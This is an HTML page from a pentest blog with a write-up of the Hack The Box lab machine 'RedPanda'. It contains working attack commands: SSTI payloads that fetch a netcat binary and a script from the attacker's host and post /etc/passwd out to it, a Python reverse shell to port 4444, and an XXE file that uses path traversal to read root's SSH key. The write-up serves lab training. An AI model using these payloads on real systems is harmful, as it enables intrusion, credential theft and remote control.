@@ -1,0 +1,241 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - RedPanda [Easy] // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - RedPanda [Easy]"/>
+<meta name="twitter:description" content="TCP Scan TARGET=10.10.11.170 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)8080/tcp open http-proxy syn-ack ttl 63| fingerprint-strings: | GetRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=UTF-8| Content-Language: en-US| Date: Sun, 17 Jul 2022 21:29:22 GMT| Connection: close| &lt;!"/>
+
+    <meta property="og:title" content="HTB - RedPanda [Easy]" />
+<meta property="og:description" content="TCP Scan TARGET=10.10.11.170 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)8080/tcp open http-proxy syn-ack ttl 63| fingerprint-strings: | GetRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=UTF-8| Content-Language: en-US| Date: Sun, 17 Jul 2022 21:29:22 GMT| Connection: close| &lt;!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/redpanda/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-07-10T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-07-10T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - RedPanda [Easy]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 10, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="tcp-scan">TCP Scan</h1>
+<pre tabindex="0"><code>TARGET=10.10.11.170 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT     STATE SERVICE    REASON         VERSION
+22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http-proxy syn-ack ttl 63
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 
+|     Content-Type: text/html;charset=UTF-8
+|     Content-Language: en-US
+|     Date: Sun, 17 Jul 2022 21:29:22 GMT
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;
+|     &lt;head&gt;
+|     &lt;meta charset=&#34;utf-8&#34;&gt;
+|     &lt;meta author=&#34;wooden_k&#34;&gt;
+|     &lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --&gt;
+|     &lt;link rel=&#34;stylesheet&#34; href=&#34;css/panda.css&#34; type=&#34;text/css&#34;&gt;
+|     &lt;link rel=&#34;stylesheet&#34; href=&#34;css/main.css&#34; type=&#34;text/css&#34;&gt;
+|     &lt;title&gt;Red Panda Search | Made with Spring Boot&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;div class=&#39;pande&#39;&gt;
+|     &lt;div class=&#39;ear left&#39;&gt;&lt;/div&gt;
+|     &lt;div class=&#39;ear right&#39;&gt;&lt;/div&gt;
+|     &lt;div class=&#39;whiskers left&#39;&gt;
+|     &lt;span&gt;&lt;/span&gt;
+|     &lt;span&gt;&lt;/span&gt;
+|     &lt;span&gt;&lt;/span&gt;
+|     &lt;/div&gt;
+|     &lt;div class=&#39;whiskers right&#39;&gt;
+|     &lt;span&gt;&lt;/span&gt;
+|     &lt;span&gt;&lt;/span&gt;
+|     &lt;span&gt;&lt;/span&gt;
+|     &lt;/div&gt;
+|     &lt;div class=&#39;face&#39;&gt;
+|     &lt;div class=&#39;eye
+|   HTTPOptions: 
+|     HTTP/1.1 200 
+|     Allow: GET,HEAD,OPTIONS
+|     Content-Length: 0
+|     Date: Sun, 17 Jul 2022 21:29:22 GMT
+|     Connection: close
+|   RTSPRequest: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Sun, 17 Jul 2022 21:29:22 GMT
+|     Connection: close
+|     &lt;!doctype html&gt;&lt;html lang=&#34;en&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 
+|     Request&lt;/title&gt;&lt;style type=&#34;text/css&#34;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 
+|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+|_http-title: Red Panda Search | Made with Spring Boot
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-open-proxy: Proxy might be redirecting requests
+</code></pre><h1 id="web-enum">web enum</h1>
+<pre tabindex="0"><code>&gt; dirsearch -u http://10.10.11.170:8080/ -x 401,403           
+[17:32:16] 200 -    2KB - /;json/
+[17:32:16] 200 -    2KB - /;login/
+[17:32:16] 200 -    2KB - /;admin/
+[17:32:16] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
+[17:32:17] 400 -  435B  - /a%5c.aspx
+[17:32:46] 500 -   86B  - /error
+[17:32:46] 500 -   86B  - /error/
+[17:33:16] 405 -  117B  - /search
+[17:33:21] 200 -  987B  - /stats/
+[17:33:21] 200 -  987B  - /stats
+
+&gt; nikto -host http://10.10.11.70:8080/
++ Server: No banner retrieved
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Uncommon header &#39;content-disposition&#39; found, with contents: inline;filename=f.txt
++ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)
++ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
++ OSVDB-397: HTTP method (&#39;Allow&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method (&#39;Allow&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.
++ OSVDB-3092: /stats/: This might be interesting...
+</code></pre><ul>
+<li>http://10.10.11.170:8080/search vulnerable to ssti</li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></li>
+</ul>
+<pre tabindex="0"><code>#{7*7}
+*{7*7}
+
+&gt; curl http://10.10.11.170:8080/search -d &#39;name=*{T(java.lang.Runtime).getRuntime().exec(&#34;wget http://10.10.16.27/nc -O /tmp/nc&#34;)}&#39;
+&gt; curl http://10.10.11.170:8080/search -d &#39;name=*{T(java.lang.Runtime).getRuntime().exec(&#34;curl http://10.10.16.27/ -d @/etc/passwd&#34;)}&#39;
+</code></pre><ul>
+<li>From reading the /etc/passwd file, we learnt there is a user called <code>woodenk</code></li>
+</ul>
+<h1 id="foothold">foothold</h1>
+<ul>
+<li>Create a python script e.py with the following</li>
+</ul>
+<pre tabindex="0"><code>&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.16.27&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;
+</code></pre><ul>
+<li>Upload the script and run it to get shell access</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl http://10.10.11.170:8080/search -d &#39;name=*{T(java.lang.Runtime).getRuntime().exec(&#34;wget http://10.10.16.27/e.py -O /tmp/e.py&#34;)}&#39;
+&gt; curl http://10.10.11.170:8080/search -d &#39;name=*{T(java.lang.Runtime).getRuntime().exec(&#34;python3 /tmp/e.py&#34;)}&#39;
+</code></pre><h1 id="pe">pe</h1>
+<ul>
+<li>linpeas enum</li>
+</ul>
+<pre tabindex="0"><code>[+] Readable files belonging to root and readable by me but not world readable
+-rw-r----- 1 root logs 422 Jul 18 01:48 /credits/damian_creds.xml
+-rw-r----- 1 root logs 426 Jul 18 01:58 /credits/woodenk_creds.xml
+-rw-r----- 1 root woodenk 33 Jul 17 22:03 /home/woodenk/user.txt
+</code></pre><ul>
+<li>examine the file</li>
+</ul>
+<pre tabindex="0"><code>&gt; cat /opt/cleanup.sh
+cat /opt/cleanup.sh
+#!/bin/bash
+/usr/bin/find /tmp -name &#34;*.xml&#34; -exec rm -rf {} \;
+/usr/bin/find /var/tmp -name &#34;*.xml&#34; -exec rm -rf {} \;
+/usr/bin/find /dev/shm -name &#34;*.xml&#34; -exec rm -rf {} \;
+/usr/bin/find /home/woodenk -name &#34;*.xml&#34; -exec rm -rf {} \;
+/usr/bin/find /tmp -name &#34;*.jpg&#34; -exec rm -rf {} \;
+/usr/bin/find /var/tmp -name &#34;*.jpg&#34; -exec rm -rf {} \;
+/usr/bin/find /dev/shm -name &#34;*.jpg&#34; -exec rm -rf {} \;
+/usr/bin/find /home/woodenk -name &#34;*.jpg&#34; -exec rm -rf {} \;
+</code></pre><ul>
+<li>Read and understand how jpg and xml files are processed</li>
+<li>It reads the artist and take that as a username entry</li>
+<li>then it reads the log for a uri and compares it with the uri in the corresponding xml file</li>
+<li>if everything matches, it then updates the xml file.</li>
+<li>Here, there is a trick that you can read about: <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; http://10.10.11.170:8877/opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java
+&gt; http://10.10.11.170:8877/opt/panda_search/redpanda.log
+</code></pre><ul>
+<li>So, potentially, we can trick the parser to process a xml file and include the root user&rsquo;s id_rsa into it.</li>
+<li>Prepare two files, any jpg and a xml file</li>
+</ul>
+<pre tabindex="0"><code>&gt; exiftool -Artist=&#39;../home/woodenk/meow&#39; meow.jpg
+&gt; touch meow_creds.xml
+
+&lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM &#34;file:///root/.ssh/id_rsa&#34;&gt; ]&gt;
+&lt;credits&gt;
+  &lt;author&gt;damian&lt;/author&gt;
+  &lt;image&gt;
+    &lt;data&gt;&amp;example;&lt;/data&gt;
+    &lt;uri&gt;/../../../../../../home/woodenk/meow.jpg&lt;/uri&gt;
+    &lt;views&gt;0&lt;/views&gt;
+  &lt;/image&gt;
+  &lt;totalviews&gt;2&lt;/totalviews&gt;
+&lt;/credits&gt;
+</code></pre><ul>
+<li>Upload the two files to the target</li>
+</ul>
+<pre tabindex="0"><code>&gt; wget http://10.10.16.27/meow.jpg -O meow.jpg
+&gt; wget http://10.10.16.27/meow.xml -O meow_creds.xml
+</code></pre><ul>
+<li>Trigger the log parser by including a user agent in our request</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl http://10.10.11.170:8080/stats -A &#34;||/../../../../../../home/woodenk/meow.jpg&#34;
+&gt; cat /opt/panda_search/redpanda.log
+</code></pre><ul>
+<li>After a while, examine the meow_creds.xml and find the root&rsquo;s id_rsa</li>
+</ul>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
